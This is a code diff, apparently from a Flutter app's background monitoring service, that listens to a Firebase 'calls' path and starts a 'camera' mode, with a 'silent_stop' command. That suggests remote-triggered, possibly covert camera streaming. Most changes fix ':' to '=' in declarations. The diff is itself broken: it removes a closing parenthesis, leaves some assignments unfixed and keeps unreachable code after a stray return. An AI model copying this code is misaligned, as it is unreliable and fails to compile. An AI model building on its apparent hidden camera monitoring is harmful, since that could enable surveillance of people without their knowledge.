@@ -10,7 +10,7 @@ const _kWizardDone: 'wizard_done';
 const _kPermKey    = 'permissions_granted';
 
 class BackgroundMonitoringService {
-  static final _svc: FlutterBackgroundService();
+  static final _svc = FlutterBackgroundService();
 
   static Future<void> initialize() async {
     await _svc.configure(
@@ -77,7 +77,7 @@ void _onStart(ServiceInstance service) async {
     )
   }
 
-  final prefs: await SharedPreferences.getInstance()
+  final prefs = await SharedPreferences.getInstance()
   final uid   = prefs.getString(_kUidKey)
   if (uid == null) { service.stopSelf(); return; }
 
@@ -89,9 +89,9 @@ void _onStart(ServiceInstance service) async {
     )
   }
 
-  service.on('stop').listen((_) => service.stopSelf())
+  service.on('stop').listen((_) => service.stopSelf()
 
-  bool streamActive: false;
+  bool streamActive = false;
   String? activeMode;
 
   Timer.periodic(const Duration(seconds: 30), (_) async {
@@ -103,7 +103,7 @@ void _onStart(ServiceInstance service) async {
   });
 
   FirebaseDatabase.instance.ref('calls/$uid').onValue.listen((event) {
-    final data: event.snapshot.value;
+    final data = event.snapshot.value;
     if (streamActive) {
       service.invoke('silent_stop', {});
       streamActive: false;
@@ -111,8 +111,8 @@ void _onStart(ServiceInstance service) async {
     }
     return;
       if (data is! Map) return;
-    final map: Map<String, dynamic>.from(data);    final status: map['status'] as String?;
-    final mode: (map['mode'] as String?) ?? 'camera';
+    final map = Map<String, dynamic>.from(data);    final status = map['status'] as String?;
+    final mode = (map['mode'] as String?) ?? 'camera';
 
     if (status == 'calling') {
       if (service is AndroidServiceInstance) {
